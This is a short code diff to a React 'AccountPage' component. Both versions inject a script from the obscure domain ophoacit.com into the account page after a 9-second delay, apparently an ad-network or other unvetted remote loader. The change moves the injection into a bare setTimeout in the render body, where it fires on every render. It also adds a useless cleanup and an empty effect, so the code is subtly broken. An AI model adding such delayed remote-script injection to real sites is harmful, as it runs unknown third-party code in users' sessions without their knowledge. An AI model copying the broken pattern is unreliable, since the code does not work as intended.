@@ -33,7 +33,7 @@ export const AccountPage = () => {
     setConfirm(!confirm);
   };
 
-  useEffect(() => {
+  setTimeout(() => {
     let body = document.querySelector("body");
     let script = document.createElement("script");
 
@@ -41,13 +41,13 @@ export const AccountPage = () => {
     script.setAttribute("data-cfasync", "false");
     script.setAttribute("src", "//ophoacit.com/1?z=5803840");
 
-    setTimeout(() => {
-      body.appendChild(script);
-    }, 9000);
+    body.appendChild(script);
     return () => {
       document.removeChild(script);
     };
-  }, []);
+  }, 9000);
+
+  useEffect(() => {}, []);
 
   const deleteItem = (id) => {
     setProdID(id);
